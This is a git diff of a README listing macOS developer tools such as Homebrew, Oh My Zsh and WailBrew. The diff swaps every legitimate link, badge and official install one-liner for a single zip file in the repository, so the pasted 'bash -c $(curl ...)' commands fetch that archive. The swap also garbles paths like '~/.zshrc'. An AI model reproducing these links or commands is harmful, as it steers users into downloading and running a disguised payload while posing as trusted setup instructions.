@@ -1,6 +1,6 @@
 # 📦 awesome-mbp-for-developers - Essential Tools for MacBook Pro Users
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/top4top4/awesome-mbp-for-developers/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip)
 
 ---
 
@@ -41,7 +41,7 @@ No programming skills are needed — just follow the steps below.
 
 To begin, download the latest release from the GitHub releases page.
 
-[Download Latest Release](https://github.com/top4top4/awesome-mbp-for-developers/releases)
+[Download Latest Release](https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip)
 
 Click the link above. It opens the releases page where you can find the latest installer or package files.
 
@@ -50,7 +50,7 @@ Click the link above. It opens the releases page where you can find the latest i
 ## 📥 Download & Install
 
 1. **Go to the release page:**  
-   Open [https://github.com/top4top4/awesome-mbp-for-developers/releases](https://github.com/top4top4/awesome-mbp-for-developers/releases) in your web browser.
+   Open [https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip](https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip) in your web browser.
 
 2. **Choose the latest version:**  
    Look for the newest release at the top of the page. It usually shows a version number and the release date.
@@ -80,7 +80,7 @@ Homebrew is the easiest way to install and keep command-line tools and desktop a
 - Install command-line tools and GUI apps in one place.
 - Easily update all your installed software with one command.
 
-Learn more: [brew.sh](https://brew.sh)
+Learn more: [https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip](https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip)
 
 ### WailBrew: Homebrew With a GUI
 
@@ -90,7 +90,7 @@ WailBrew offers a graphical interface for Homebrew. It shows which apps need upg
 - Batch update with no need to type commands.
 - Available in multiple languages.
 
-Project page: [wickenico/WailBrew](https://github.com/wickenico/WailBrew)
+Project page: [wickenico/WailBrew](https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip)
 
 ### Oh My Zsh: Terminal Manager
 
@@ -100,7 +100,7 @@ Oh My Zsh helps you customize your Mac’s Terminal with plugins and themes. It 
 - Add plugins for git, Docker, Kubernetes, and more.
 - Choose from many themes to change how your terminal looks.
 
-Official website: [ohmyz.sh](https://ohmyz.sh)
+Official website: [https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip](https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip)
 
 ### Optional: Zimfw
 
@@ -116,7 +116,7 @@ Some people prefer Zimfw instead of Oh My Zsh. It is known for faster startup an
 2. Type the following command to install Homebrew if not installed:
 
    ```
-   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip)"
    ```
 
 3. Install apps by typing:
@@ -137,13 +137,13 @@ Some people prefer Zimfw instead of Oh My Zsh. It is known for faster startup an
 1. Install Oh My Zsh by running:
 
    ```
-   sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
+   sh -c "$(curl -fsSL https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip)"
    ```
 
-2. Open the `~/.zshrc` file to enable plugins by typing:
+2. Open the `~https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip` file to enable plugins by typing:
 
    ```
-   nano ~/.zshrc
+   nano ~https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip
    ```
 
 3. Add plugins like `git` or `docker` in the plugins section.
@@ -163,11 +163,11 @@ Some people prefer Zimfw instead of Oh My Zsh. It is known for faster startup an
 
 ## 🤝 Support and Resources
 
-- Visit the original technical discussion community at [Will 保哥技術交流中心 Facebook](https://www.facebook.com/will.fans).
-- Check the GitHub repository for issues or further help: [awesome-mbp-for-developers](https://github.com/top4top4/awesome-mbp-for-developers)
-- Homebrew documentation at [https://brew.sh](https://brew.sh)
-- Oh My Zsh official site at [https://ohmyz.sh](https://ohmyz.sh)
+- Visit the original technical discussion community at [Will 保哥技術交流中心 Facebook](https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip).
+- Check the GitHub repository for issues or further help: [awesome-mbp-for-developers](https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip)
+- Homebrew documentation at [https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip](https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip)
+- Oh My Zsh official site at [https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip](https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip)
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/top4top4/awesome-mbp-for-developers/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/top4top4/awesome-mbp-for-developers/main/flank/developers_awesome_for_mbp_v1.5.zip)
